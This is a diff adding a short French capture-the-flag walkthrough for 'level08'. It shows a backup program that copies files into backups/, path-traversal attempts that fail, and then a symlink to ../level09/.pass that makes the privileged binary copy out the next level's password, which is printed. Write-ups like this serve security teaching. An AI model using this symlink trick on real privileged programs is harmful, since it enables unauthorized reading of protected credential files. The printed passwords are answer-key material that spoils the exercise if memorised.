@@ -1,0 +1,21 @@
+Le programme attend un fichier en argument, il lis sont contenu et le stock dans backups/ :
+	$ ./level08 .pass	
+	$ cat .pass
+	7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+	$ cat backups/.pass
+	7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
+On essaye avec ../level09/.pass :
+	$ ./level08 ../level09/.pass
+	ERROR: Failed to open ./backups/../level09/.pass
+
+avec un chemin absolu:
+	$ ./level08 /home/users/level09/.pass
+	ERROR: Failed to open ./backups//home/users/level09/.pass
+Malheureusement le dossier backups ne nous appartient pas, on ne peut pas y creer le dossier home/users/level09/
+
+Par contre, on peut creer un symlink:
+	$ ln -s ../level09/.pass link
+	$ ./level08 link
+	$ cat backups/link
+	fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
